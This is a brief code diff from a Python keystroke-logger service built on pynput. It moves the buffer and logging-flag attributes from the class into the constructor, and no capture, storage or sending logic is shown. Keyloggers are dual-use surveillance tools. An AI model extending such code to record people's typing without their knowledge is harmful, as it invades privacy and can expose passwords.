@@ -4,11 +4,12 @@ from typing import List
 from pynput import keyboard
 
 class KeyLoggerService(IKeyLogger):
-    __buffer = Buffer()
-    __is_logging = False
+
 
     def __init__(self):
         self.listener = None
+        self.__buffer = Buffer()
+        self.__is_logging = False
 
     def start_logging(self) -> None:
         self.__is_logging = True
